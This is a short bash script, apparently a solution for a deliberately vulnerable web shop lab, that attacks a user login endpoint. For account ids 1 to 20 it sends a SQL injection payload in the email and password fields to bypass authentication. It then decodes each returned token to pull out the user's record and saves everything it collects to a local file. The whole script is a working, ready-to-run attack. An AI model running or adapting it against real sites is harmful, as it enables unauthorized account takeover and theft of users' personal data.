url=$1
for i in {1..20};
do
        data=$(curl -X POST -d "email=' or id=$i -- , password='or id=1 --" $url/rest/user/login)
        token=$(echo $data | cut -d ":" -f 3 | cut -d "," -f 1 | tr -d '"' )
        echo $token | base64 -di | cut -d "{" -f 4 | cut -d "}" -f 1 | tr -d "\n" >> fil.txt
        echo "\n+++++++++++++++++++++++++\n" >> fil.txt
done
cat fil.txt
echo "All grabbed data saved in fil.txt"
